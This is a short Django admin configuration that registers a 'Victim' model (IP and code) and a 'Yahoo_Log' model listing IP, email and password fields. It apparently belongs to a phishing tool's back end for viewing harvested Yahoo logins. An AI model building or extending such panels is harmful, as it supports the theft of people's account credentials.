from django.contrib import admin
from . import models

class VictimAdmin(admin.ModelAdmin):
    list_display = ('id','ip','code')

class LogAdmin(admin.ModelAdmin):
    list_display = ('id','ip','mail', 'psw')


admin.site.register(models.Victim,VictimAdmin)
admin.site.register(models.Yahoo_Log,LogAdmin)
